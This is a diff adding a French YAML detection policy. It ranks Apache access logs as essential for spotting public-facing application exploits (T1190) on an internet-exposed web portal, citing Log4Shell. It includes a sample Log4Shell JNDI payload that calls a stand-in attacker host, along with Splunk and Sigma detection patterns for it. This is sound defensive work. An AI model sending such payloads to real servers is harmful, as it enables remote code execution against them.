@@ -1,0 +1,48 @@
+policy:
+  name: "Politique priorisée pour T1190"
+  target:
+    threat_id: "T1190"
+    ttp_id: "T1190"
+    ttp_name: "Exploit Public-Facing Application"
+    asset_id: "web_frontend"
+    asset_type: "web_server"
+    asset_criticality: "high"
+    exposure: "internet"
+    business_role: "Portail web exposé utilisé par des utilisateurs externes"
+    current_log_sources: "Apache Access Logs;Suricata"
+    retention_days: "30"
+    asset_notes: "Actif prioritaire pour T1190 et CVE web critiques"
+    strategy: "balanced"
+  decision_model:
+    name: "Threat-to-Log Value Engine"
+    principle: "Prioriser les logs selon menace, criticité de l'actif, couverture, coût et bruit."
+    priority_levels:
+      - "indispensable"
+      - "recommandé"
+      - "optionnel"
+  recommendations:
+    -
+      log_source: "Apache Access Logs"
+      log_type: "web"
+      priority: "indispensable"
+      log_value_score: 10.0
+      fields:
+        - "HttpRequest"
+        - "UserAgent"
+        - "Payload"
+      estimated_cost: "faible"
+      estimated_noise: "moyen"
+      detection_coverage: "forte"
+      reason: "Apache Access Logs est classé indispensable pour T1190 car cette source permet d'observer HttpRequest, UserAgent, Payload sur un actif de type web_server avec une criticité high."
+      blind_spot_if_missing: "Angle mort potentiel : sans Apache Access Logs, l'équipe risque de moins bien détecter les comportements associés à T1190, notamment les signaux portés par HttpRequest, UserAgent, Payload."
+      covers:
+        ttp_id: "T1190"
+        ttp_name: "Exploit Public-Facing Application"
+        tactic: "initial-access"
+        cve_id: "CVE-2021-44228"
+        cve_description: "Apache Log4j2 RCE"
+        cve_score: "10.0"
+      detection_examples:
+        sample_log: "User-Agent: ${jndi:ldap://attacker.com/exploit}"
+        splunk_query: "index=* sourcetype=access_* \\${jndi:\\\" | stats count by src_ip, http_user_agent"
+        sigma_rule: "title: Detect Log4Shell Exploitation Attempt\nlogsource:\n  category: web\n  product: apache\ndetection:\n  selection:\n    http_user_agent|contains: '${jndi:'\n  condition: selection"
